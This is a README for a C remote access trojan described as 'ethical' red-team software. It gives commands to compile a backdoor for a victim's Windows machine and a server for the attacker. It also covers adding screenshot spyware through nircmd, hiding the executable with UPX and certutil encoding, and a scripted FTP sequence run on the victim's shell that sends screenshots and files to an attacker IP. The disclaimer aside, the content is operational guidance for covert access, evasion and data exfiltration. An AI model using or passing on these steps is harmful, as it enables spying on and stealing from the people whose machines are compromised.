# C++ Backdoor/RAT </br>
### _Ethical Remote Access Tool for Red Teams / Educational use ONLY_ </br>
Do not use for Black Hat purposes
**by Pol Galvez**

## How to Use</br>
1) **Compile client for victims windows machine:**
```sh
i686-w64-mingw32-gcc -o /Documents/EternalPurple/bin/client/backdoor.exe /Documents/EternalPurple/backdoor.c -lwsock32 -lwininet
```

2)** Compile server for linux attackers machine:**
```sh
gcc /home/kali/Documents/EternalPurple/server.c -o /home/kali/Documents/EternalPurple/bin/server/server.exe
```
3) **Execute**
```sh
./server.exe
backdoor.exe
```

Commands assume that you have a linux OS and mingw installed
Also that you have backdoor.c and server.c on a Folder Called EternalPurple on your Documents


## Functionalities: </br>
### Screenshot:
![alt text](https://github.com/PolGs/C-EthicalRAT/blob/main/Screenshot%202021-07-29%20012247.png?raw=true)
thanks to  • SCHØØL ZERØ • for tutorials on how to do this
https://www.youtube.com/c/SCHØØLZERØ <br>
Playlist Creating similar RAT<br>
https://youtube.com/playlist?list=PLSqjYSJtqeaV1Hdk2ZVnr90KpDObfzDSs
https://youtu.be/6Dc8i1NQhCM<br>
Easy metasploit spyware:<br>
https://youtu.be/V67VIQB7N0w

## Other
To gain spyware functionalities you can use nircmd: https://www.nirsoft.net/utils/nircmd.html

## nircmd command to take screenshots
nircmd.exe savescreenshot screen1.png

##certutil comand to encode / decode or use UPX to Obfuscate executable \n
UPX: https://upx.github.io
```sh
upx program.exe
```

```sh
certutil -encode test.exe test.txt
```
```sh
certutil -decode test.txt test.exe
```
## ftp echos to Download files change put for get to Upload (This is done client side on the Shell)
```sh
echo open 192.168.1.171 >> ftp.txt
echo kali>> ftp.txt
echo kali>> ftp.txt
echo bin>> ftp.txt
echo put s1.png>> ftp.txt
echo bye>> ftp.txt

ftp -s:ftp.txt

open 192.168.44.130
kali
kali
put P1010975.JPG
bye
```
## License
Open Source<br>
**Free Software, Hell Yeah!**
